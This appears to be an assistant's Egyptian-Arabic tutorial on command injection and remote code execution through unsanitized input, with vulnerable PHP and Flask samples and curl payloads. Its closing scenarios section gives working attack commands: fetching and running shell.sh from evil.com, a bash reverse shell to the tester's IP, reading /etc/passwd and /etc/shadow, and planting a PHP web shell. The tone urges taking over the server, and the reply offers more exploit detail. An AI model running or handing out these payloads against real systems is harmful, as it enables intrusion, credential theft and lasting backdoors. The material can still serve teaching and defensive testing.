تمام، هشرحلك القسم ده عن "حقن الأوامر والتنفيذ عن بُعد للكود (Command Injection and Remote Code Execution - RCE)" مع التركيز على استغلال المدخلات غير المنظفة (Unsanitized User Input) بعمق وعملي مع أكواد وأوامر، وبعد كل جزء هاديك خلاصة Pentest بالعامية المصرية، وفي الآخر هاديك سيناريوهات الاستغلال الممكنة.

---

### **1. حقن الأوامر (Command Injection)**
#### **شرح عملي:**
حقن الأوامر هو لما المهاجم بيحط أوامر نظام (زي أوامر Linux أو Windows) في مدخلات المستخدم (زي حقل بحث أو نموذج)، والتطبيق بينفذها لأنه مش بينظف المدخلات دي. يعني لو التطبيق بيستخدم دالة زي `system()` في PHP من غير فحص، ممكن تنفذ أي حاجة.

- **مثال:** لو حقل بحث بياخد المدخل ويحطه في أمر `ping`، المهاجم بيقدر يضيف أوامر تانية.

#### **كود عملي (PHP مع Command Injection):**
- كود ضعيف:
```php
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $output = shell_exec("ping -c 4 " . $ip); # بدون تنظيف
    echo "<pre>$output</pre>";
}
?>
```
- لو بعتت طلب زي:
```
http://<IP>/ping.php?ip=8.8.8.8; whoami
```
- السيرفر هينفذ `ping -c 4 8.8.8.8; whoami`، ويرجعلك اسم المستخدم (زي `www-data`).

#### **أمر عملي (تجربة يدوية):**
- جرب بـ curl:
```bash
curl "http://<IP>/ping.php?ip=127.0.0.1; id"
```
- لو رجعلك `uid=33(www-data) gid=33(www-data)`، يبقى نفذت أمر!

#### **خلاصة Pentest بالعامية:**
"لو لقيت حقل بياخد مدخلات زي IP أو اسم، جرب تضيف `; id` أو `&& whoami` وشوف لو بيرجعلك حاجة. لو نفع، يبقى تقدر تخلي السيرفر يعملك أي حاجة زي القهوة!"

---

### **2. التنفيذ عن بُعد للكود (Remote Code Execution - RCE)**
#### **شرح عملي:**
RCE هو نوع أخطر من Command Injection، لأنه بيسمحلك تنفذ كود برمجي كامل (زي PHP أو Python) على السيرفر، مش مجرد أوامر نظام. بيحصل لو التطبيق بيستخدم دوال زي `eval()` أو `exec()` على مدخلات المستخدم بدون تنظيف.

- **مثال:** لو حقل بياخد تعبير رياضي ويحطه في `eval()`، ممكن تحول التعبير لكود خبيث.

#### **كود عملي (PHP مع RCE):**
- كود ضعيف:
```php
<?php
if (isset($_GET['calc'])) {
    $calc = $_GET['calc'];
    eval("echo $calc;"); # خطر جدًا
}
?>
```
- لو بعتت طلب زي:
```
http://<IP>/calc.php?calc=1+1; system('whoami');
```
- هيرجعلك `www-data` بدل ما يحسب `1+1` بس!

#### **أمر عملي (تجربة RCE):**
- جرب:
```bash
curl "http://<IP>/calc.php?calc=1; phpinfo();"
```
- لو رجعلك صفحة `phpinfo()`، يبقى نفذت كود PHP!

#### **خلاصة Pentest بالعامية:**
"لو شكيت إن فيه حقل بينفذ كود، جرب تحط `; phpinfo();` أو `; system('id');` وشوف لو بيطلعلك حاجة. لو نجحت، يبقى تقدر تكتب سكربت كامل وترفعه على السيرفر!"

---

### **3. استغلال المدخلات غير المنظفة (Exploiting Unsanitized User Input)**
#### **شرح عملي:**
المدخلات غير المنظفة هي السبب الرئيسي للثغرات دي. لو التطبيق ما بيفلترش أو بيثق في اللي بتبعته (زي حروف، أرقام، أو أوامر)، المهاجم بيقدر يحقن أي حاجة تنفذ على السيرفر.

- **التأثير:** بيسمح بتنفيذ أوامر زي حذف ملفات أو فتح Shell.

#### **كود عملي (Python مع Command Injection):**
- كود Flask ضعيف:
```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/run')
def run_command():
    cmd = request.args.get('cmd')
    result = os.popen(cmd).read() # بدون تنظيف
    return result

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
- لو بعتت:
```
http://<IP>:5000/run?cmd=ls -la
```
- هيرجعلك لستة الملفات (في لينكس `ls` يتغير بـ `dir` في ويندوز).

#### **أمر عملي (تجربة):**
```bash
curl "http://<IP>:5000/run?cmd=whoami"
```
- لو رجعلك اسم المستخدم، يبقى استغليتها!

#### **خلاصة Pentest بالعامية:**
"جرب تحط أوامر زي `; ls` أو `&& dir` في أي حقل أو لينك، لو السيرفر نفذها يبقى ما فيهوش فلترة. ابدأ نفذ حاجات أكبر زي `cat /etc/passwd` واستمتع!"

---

### **سيناريوهات الاستغلال الممكنة (Exploitation Scenarios):**
1. **Command Injection:**
   - **Basic Commands:** جرب أوامر زي:
     ```bash
     curl "http://<IP>/ping.php?ip=127.0.0.1; cat /etc/passwd"
     ```
     لو رجعلك ملفات النظام، يبقى نجحت.
   - **Chaining:** نفذ أوامر متتالية:
     ```bash
     curl "http://<IP>/ping.php?ip=127.0.0.1 && wget http://evil.com/shell.sh && bash shell.sh"
     ```
     هيحمل سكربت وينفذه.

2. **Remote Code Execution (RCE):**
   - **PHP Execution:** لو فيه `eval()`، جرب:
     ```bash
     curl "http://<IP>/calc.php?calc=1; file_get_contents('/etc/passwd');"
     ```
   - **Reverse Shell:** نفذ كود يفتح Shell:
     ```bash
     curl "http://<IP>/calc.php?calc=1; system('bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1');"
     ```
     شغل `nc -lvnp 4444` على جهازك وخد السيرفر.

3. **مشترك (Unsanitized Input):**
   - **File Access:** اسحب ملفات حساسة:
     ```bash
     curl "http://<IP>/run?cmd=cat /etc/shadow"
     ```
   - **Backdoor:** اكتب ملف خبيث:
     ```bash
     curl "http://<IP>/run?cmd=echo '<?php system($_GET[cmd]); ?>' > shell.php"
     ```
     افتح `http://<IP>/shell.php?cmd=id`.
   - **Automated Testing:** استخدم Burp أو wfuzz تكتشف الحقن:
     ```bash
     wfuzz -c -z file,/usr/share/wordlists/payloads.txt --hs "error" "http://<IP>/run?cmd=FUZZ"
     ```

---

لو عايز تفاصيل أكتر عن أي سيناريو أو كود استغلال معين، قوللي وأنا أفصلك!